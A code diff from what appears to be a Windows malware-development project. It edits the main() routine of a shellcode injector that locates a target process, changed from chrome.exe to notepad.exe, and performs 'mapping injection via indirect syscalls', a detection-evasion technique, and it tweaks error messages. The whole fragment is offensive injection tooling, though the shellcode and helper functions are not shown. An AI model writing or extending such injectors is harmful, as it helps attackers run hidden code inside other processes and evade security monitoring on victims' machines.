@@ -1,6 +1,6 @@
 #include "Mapping.h"
 
-#define TARGET_PROCESS L"chrome.exe"
+#define TARGET_PROCESS L"notepad.exe"
 
 
 int main()
@@ -44,22 +44,20 @@ int main()
 
 
 
-	wprintf(L"[i] Searching For Process Id Of \"%s\" ... \n", TARGET_PROCESS);
 	if (!GetRemoteProcessHandle(TARGET_PROCESS, &PID, &hProcess)) {
-		WARN("Could not get Remote Process Handle! Reason: %lu", GetLastError());
+		PRINT_ERROR("GetRemoteProcessHandle");
 		return -1;
 	}
 	OKAY("Found Target Process Pid: %d", PID);
 
 
-	printf("[i] Injecting Target Process ... \n");
 	if (!RemoteMapInject(hProcess, hThread, Shellcode, sizeof(Shellcode), &pAddress)) {
-		WARN("Could Not Perform Mapping Injection! Reason: %lu", GetLastError());
+		PRINT_ERROR("RemoteMapInject");
 		return -1;
 	}
 	OKAY("Successfully Completed Mapping Injection via Indirect Syscalls!");
 
-	printf("[#] Press <Enter> To Quit ... ");
+	printf("[>] Press <Enter> To Quit ... ");
 	getchar();
 
 	return 0;
